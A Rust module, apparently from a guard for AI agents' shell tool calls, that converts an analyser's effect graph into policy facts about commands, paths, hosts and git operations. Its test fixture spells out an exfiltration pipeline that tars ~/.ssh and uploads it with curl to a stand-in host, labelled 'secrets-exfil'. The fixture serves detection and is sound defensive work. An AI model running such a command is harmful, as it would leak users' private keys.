//! Maps what nah established (`graph.rs`'s neutral value) onto callguard's
//! `Facts`, from nah's effect graph.

use std::collections::BTreeMap;

use crate::graph::list;
use callguard::nah::NahCall;
use callguard::schema::{FactCommand, FactEffect, FactGit, FactHost, FactPath, Facts};
use serde_json::Value;

fn text(v: &Value, key: &str) -> String {
    v.get(key).and_then(Value::as_str).unwrap_or("").to_owned()
}

/// The commands by node id.
fn by_id(commands: &[Value]) -> BTreeMap<u64, &Value> {
    commands
        .iter()
        .filter_map(|c| Some((c.get("id")?.as_u64()?, c)))
        .collect()
}

/// The program (else the kind) of the node `parent` that ran a command, unless
/// that node is the tool call itself; "" for a command the tool ran directly.
fn via_of(by_id: &BTreeMap<u64, &Value>, parent: u64) -> String {
    by_id
        .get(&parent)
        .filter(|p| !p.get("parent").is_none_or(Value::is_null))
        .map(|p| match text(p, "program") {
            t if t.is_empty() => text(p, "kind"),
            t => t,
        })
        .unwrap_or_default()
}

/// Every call but the root, unknown ones included, for permission rules:
/// `Facts.commands` leaves out the calls whose argv nah could not spell, and an
/// allow rule must see them. An argv with a non-string element is unknown.
pub(crate) fn calls(nf: &Value) -> Vec<NahCall> {
    let commands = list(nf, "commands");
    let by_id = by_id(commands);
    let mut seen_root = false;
    commands
        .iter()
        .filter_map(|c| {
            let Some(parent) = c.get("parent").and_then(Value::as_u64) else {
                // The root is the tool call itself; a second parentless node
                // would be a call we cannot place, so it is listed.
                if !std::mem::replace(&mut seen_root, true) {
                    return None;
                }
                return Some(NahCall {
                    argv: None,
                    program: text(c, "program"),
                    cwd: None,
                    via: String::new(),
                });
            };
            let argv = c
                .get("argv")
                .and_then(Value::as_array)
                .and_then(|a| a.iter().map(|x| x.as_str().map(str::to_owned)).collect());
            let via = via_of(&by_id, parent);
            Some(NahCall {
                argv,
                program: text(c, "program"),
                cwd: c.get("cwd").and_then(Value::as_str).map(str::to_owned),
                via,
            })
        })
        .collect()
}

/// `Facts` from the neutral value. `guards` are nah's policy attribution
/// names, `coverage` its overall coverage.
pub(crate) fn map(nf: &Value, guards: Vec<String>, coverage: &str) -> Facts {
    let mut f = Facts {
        source: "nah".into(),
        coverage: coverage.into(),
        guards,
        ..Default::default()
    };
    let commands = list(nf, "commands");
    let by_id = by_id(commands);
    for c in commands {
        let Some(parent) = c.get("parent").and_then(Value::as_u64) else {
            continue; // the tool call itself
        };
        let Some(argv) = c.get("argv").and_then(Value::as_array) else {
            continue; // a command nah could not spell
        };
        let fc = FactCommand {
            argv: argv
                .iter()
                .map(|a| a.as_str().map_or_else(|| a.to_string(), str::to_owned))
                .collect(),
            cwd: text(c, "cwd"),
            via: via_of(&by_id, parent),
        };
        f.commands.push(fc);
    }

    let (mut home, mut roots) = (String::new(), Vec::<String>::new());
    for o in list(nf, "observations") {
        match o.get("kind").and_then(Value::as_str) {
            Some("env") if o.get("subject").and_then(Value::as_str) == Some("HOME") => {
                home = o
                    .pointer("/value/text")
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_owned();
            }
            Some("roots") => {
                for r in o
                    .get("value")
                    .and_then(Value::as_array)
                    .into_iter()
                    .flatten()
                {
                    if let Some(p) = r.get("path").and_then(Value::as_str) {
                        roots.push(p.to_owned());
                    }
                }
            }
            _ => {}
        }
    }

    let mut paths: BTreeMap<String, FactPath> = BTreeMap::new();
    for e in list(nf, "effects") {
        let kind = effect_kind(&text(e, "kind"));
        let details = e.get("details").and_then(Value::as_object);
        let mut target = String::new();
        for r in list(e, "resources") {
            let (name, role) = (text(r, "name"), text(r, "role"));
            if (role == "target" || role == "repository" || target.is_empty())
                && (target.is_empty() || role == "target")
            {
                target = name.clone();
            }
            match text(r, "kind").as_str() {
                "HostPath" => {
                    if is_absolute(&name) {
                        let (mut scope, sens) = path_labels(r.get("labels"));
                        if scope.is_empty() {
                            scope = path_scope(&name, &home, &roots);
                        }
                        let p = paths.entry(name.clone()).or_default();
                        p.path = name.clone();
                        p.scope = scope;
                        if !sens.is_empty() {
                            p.sensitivity = sens;
                        }
                    }
                }
                "Endpoint" if !name.is_empty() => f.hosts.push(FactHost {
                    host: name.clone(),
                    operation: kind.strip_prefix("net.").unwrap_or(&kind).to_owned(),
                    direction: String::new(),
                }),
                _ => {}
            }
        }
        let mut detail = String::new();
        let modality = text(e, "modality");
        if modality.eq_ignore_ascii_case("may")
            || e.get("conditional").and_then(Value::as_bool) == Some(true)
        {
            detail = "may".into();
        }
        if let Some(d) = details.filter(|d| !d.is_empty()) {
            let json = serde_json::to_string(d).unwrap_or_default();
            detail = format!("{detail} {json}").trim().to_owned();
        }
        f.effects.push(FactEffect {
            kind: kind.clone(),
            target,
            detail,
            certainty: text(e, "certainty").to_lowercase(),
        });
        if let Some(op) = kind.strip_prefix("git.") {
            f.git.push(FactGit {
                op: op.to_owned(),
                remote: String::new(),
                git_ref: details
                    .and_then(|d| d.get("revision"))
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_owned(),
                force: details
                    .and_then(|d| d.get("force"))
                    .and_then(Value::as_bool)
                    .unwrap_or(false),
            });
        }
    }
    f.paths = paths.into_values().collect();
    for g in list(nf, "gaps") {
        let words: Vec<String> = ["category", "domain", "code"]
            .iter()
            .map(|k| text(g, k))
            .collect();
        f.gaps.push(
            words
                .join(" ")
                .split_whitespace()
                .collect::<Vec<_>>()
                .join(" "),
        );
    }
    f
}

/// nah's effect payloads onto the judge's effect vocabulary.
fn effect_kind(k: &str) -> String {
    let (variant, op) = k.split_once('/').unwrap_or((k, ""));
    let base = match variant {
        "FilesystemAccess" => "fs".to_owned(),
        "FilesystemSearch" => "fs.search".to_owned(),
        "NetworkAccess" => "net".to_owned(),
        "ProcessExecution" => "exec".to_owned(),
        "ExecutionInput" => "exec.input".to_owned(),
        "EnvironmentAccess" => "env".to_owned(),
        "CredentialAccess" => "credential".to_owned(),
        "GitRead" => "git.read".to_owned(),
        "GitStash" => "git.stash".to_owned(),
        "HostedDeletion" => "hosted.delete".to_owned(),
        other => {
            let k = kebab(other);
            match k.strip_prefix("git-") {
                Some(rest) => format!("git.{rest}"),
                None => k,
            }
        }
    };
    if op.is_empty() {
        return base;
    }
    if variant == "FilesystemAccess" {
        let mapped = match op {
            "Create" => Some("write"),
            "PermissionChange" => Some("chmod"),
            "MetadataMutation" => Some("metadata"),
            _ => None,
        };
        if let Some(m) = mapped {
            return format!("{base}.{m}");
        }
    }
    format!("{base}.{}", kebab(op))
}

fn kebab(s: &str) -> String {
    let mut out = String::new();
    for (i, c) in s.chars().enumerate() {
        if c.is_uppercase() {
            if i > 0 {
                out.push('-');
            }
            out.extend(c.to_lowercase());
        } else {
            out.push(c);
        }
    }
    out
}

/// A POSIX path or a Windows drive path (nah names those `C:/...`).
fn is_absolute(p: &str) -> bool {
    p.starts_with('/') || drive_rest(p).is_some()
}

/// The part of a Windows drive path after `C:`.
fn drive_rest(p: &str) -> Option<&str> {
    let b = p.as_bytes();
    (b.len() >= 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && matches!(b[2], b'/' | b'\\'))
        .then(|| &p[2..])
}

/// Places `p`: project (under a project root), home, temp, system or outside.
fn path_scope(p: &str, home: &str, roots: &[String]) -> String {
    let slashed = |s: &str| s.replace('\\', "/");
    let (p, home) = (slashed(p), slashed(home));
    let roots: Vec<String> = roots.iter().map(|r| slashed(r)).collect();
    let (p, home) = (p.as_str(), home.as_str());
    // Windows paths compare without regard to case.
    let fold = |s: &str| {
        if drive_rest(p).is_some() {
            s.to_ascii_lowercase()
        } else {
            s.to_owned()
        }
    };
    let under = |dir: &str| {
        !dir.is_empty() && {
            let (pp, dd) = (fold(p), fold(dir.trim_end_matches('/')));
            pp == dd || pp.starts_with(&format!("{dd}/"))
        }
    };
    if roots.iter().any(|r| under(r)) {
        return "project".into();
    }
    if under(home) {
        return "home".into();
    }
    if under("/tmp") || under("/var/tmp") || under("/private/tmp") {
        return "temp".into();
    }
    let posix = drive_rest(p).unwrap_or(p);
    let top = posix
        .trim_start_matches('/')
        .split('/')
        .next()
        .unwrap_or("");
    match top {
        "Windows" | "Program Files" | "Program Files (x86)" | "ProgramData" => "system".into(),
        "" | "etc" | "usr" | "bin" | "sbin" | "lib" | "lib64" | "boot" | "dev" | "proc" | "sys"
        | "var" | "opt" | "System" | "Library" | "private" => "system".into(),
        _ => "outside".into(),
    }
}

/// The scope ("project", "home", ...) and sensitivity ("key-material", ...)
/// nah attached to a path resource, if it did.
fn path_labels(labels: Option<&Value>) -> (String, String) {
    let Some(l) = labels else {
        return (String::new(), String::new());
    };
    let scope = l
        .pointer("/scope/kind")
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_owned();
    let sens = l
        .get("sensitivity")
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_owned();
    (scope, sens)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn effect_kinds_follow_the_judge_vocabulary() {
        for (k, want) in [
            ("FilesystemAccess/Delete", "fs.delete"),
            ("FilesystemAccess/Create", "fs.write"),
            ("NetworkAccess/Upload", "net.upload"),
            ("ProcessExecution", "exec"),
            ("GitHistoryRewrite", "git.history-rewrite"),
            ("GitRead/Status", "git.read.status"),
        ] {
            assert_eq!(effect_kind(k), want, "{k}");
        }
    }

    #[test]
    fn maps_commands_paths_hosts_and_gaps() {
        let nf = json!({
            "commands": [
                {"id": 0, "parent": null, "kind": "Shell", "program": "Bash", "argv": null, "cwd": "/w"},
                {"id": 1, "parent": 0, "kind": "Argv", "program": "tar", "argv": ["tar", "czf", "-", "/home/u/.ssh"], "cwd": "/w"},
                {"id": 2, "parent": 0, "kind": "Argv", "program": "curl", "argv": ["curl", "-T", "-", "http://x"], "cwd": "/w"},
                {"id": 3, "parent": 1, "kind": "Argv", "program": "sh", "argv": ["sh"], "cwd": "/w"},
            ],
            "effects": [
                {"kind": "FilesystemAccess/Read", "certainty": "Exact", "modality": "May", "conditional": false,
                 "details": {"recursive": true},
                 "resources": [{"kind": "HostPath", "name": "/home/u/.ssh", "role": "target",
                                "labels": {"scope": {"kind": "home"}, "sensitivity": "key-material"}}]},
                {"kind": "NetworkAccess/Upload", "certainty": "Exact", "modality": "May", "conditional": true,
                 "details": {}, "resources": [{"kind": "Endpoint", "name": "x", "role": "destination"}]},
            ],
            "gaps": [{"category": "limit", "domain": "exec", "code": "execution-limit"}],
            "observations": [{"kind": "env", "subject": "HOME", "value": {"text": "/home/u"}}],
        });
        let f = map(&nf, vec!["secrets-exfil".into()], "full");
        assert_eq!(f.source, "nah");
        assert_eq!(f.guards, ["secrets-exfil"]);
        assert_eq!(f.commands.len(), 3, "the root call is left out");
        assert_eq!(f.commands[0].argv[0], "tar");
        assert_eq!(f.commands[0].via, "");
        assert_eq!(f.commands[2].via, "tar");
        assert_eq!(f.paths[0].scope, "home");
        assert_eq!(f.paths[0].sensitivity, "key-material");
        assert_eq!(f.hosts[0].host, "x");
        assert_eq!(f.hosts[0].operation, "upload");
        assert_eq!(f.effects[0].detail, "may {\"recursive\":true}");
        assert_eq!(f.gaps, ["limit exec execution-limit"]);
    }

    #[test]
    fn calls_list_every_call_but_the_root_unknown_ones_included() {
        let nf = json!({
            "commands": [
                {"id": 0, "parent": null, "program": "Bash", "argv": null, "cwd": "/w"},
                {"id": 1, "parent": 0, "program": "bash", "argv": ["bash", "-c", "x"], "cwd": "/w"},
                {"id": 2, "parent": 1, "program": "git", "argv": ["git", "status"], "cwd": "/w"},
                {"id": 3, "parent": 1, "program": null, "argv": null, "cwd": null},
                {"id": 4, "parent": 0, "program": "ls", "argv": ["ls", 1], "cwd": "/w"},
                {"id": 5, "parent": null, "program": "other", "argv": ["other"], "cwd": "/w"},
            ],
        });
        let calls = calls(&nf);
        assert_eq!(calls.len(), 5);
        assert_eq!(calls[0].argv.as_deref().unwrap()[0], "bash");
        assert_eq!(calls[0].via, "");
        assert_eq!(calls[1].via, "bash");
        assert_eq!(calls[1].cwd.as_deref(), Some("/w"));
        assert_eq!(calls[2].argv, None, "an unspellable call is listed");
        assert_eq!(calls[2].cwd, None);
        assert_eq!(
            calls[3].argv, None,
            "a non-string element makes the argv unknown"
        );
        assert_eq!(calls[4].argv, None, "a second root is an unplaced call");
        assert!(super::calls(&json!({})).is_empty());
    }

    #[test]
    fn path_scope_places_paths() {
        let roots = vec!["/w/p".to_owned()];
        assert_eq!(path_scope("/w/p/src", "/home/u", &roots), "project");
        assert_eq!(path_scope("/home/u/.ssh", "/home/u", &roots), "home");
        assert_eq!(path_scope("/tmp/x", "/home/u", &roots), "temp");
        assert_eq!(path_scope("/etc/passwd", "/home/u", &roots), "system");
        assert_eq!(path_scope("/data/x", "/home/u", &roots), "outside");
    }
}
